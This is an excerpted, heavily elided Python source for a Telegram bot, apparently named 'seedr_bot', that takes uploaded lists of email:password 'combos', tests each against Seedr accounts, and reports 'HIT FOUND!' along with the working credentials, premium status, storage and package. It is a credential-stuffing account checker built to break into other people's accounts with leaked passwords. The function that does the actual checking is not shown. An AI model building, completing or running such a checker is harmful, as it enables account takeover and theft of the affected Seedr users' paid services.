...
# Initialize Bot
app = Client("seedr_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
...
async def register_command(client, message):
    ...
    if user_id in registered_users:
        ...
        await message.reply("✅ **Registration successful!** Use `/seedr` to start checking combos.", quote=True)
...
# Seedr Command
@app.on_message(filters.command("seedr") & filters.private)
async def seedr_command(client, message):
    user_id = message.from_user.id
    ...
    if message.reply_to_message and message.reply_to_message.document:
        ...
        await message.reply("❌ **Reply to a valid text file with the `/seedr` command.**", quote=True)
...
async def check_combos(client, message, combos, processing_message):
    ...
    for i, combo in enumerate(combos):
        ...
        status, response = await check_seedr_account(email, password)
        ...
        if status == "Hit":
            ...
            hit_message = (
                ...
                "✅ **HIT FOUND!**\n\n"
                f"**Combo:** `{combo.strip()}`\n"
                f"**Premium:** {response['premium']}\n"
                f"**Storage:** {response['storage']}\n"
                f"**Package:** {response['package']}\n"
...
# Seedr API Check
async def check_seedr_account(email, password):
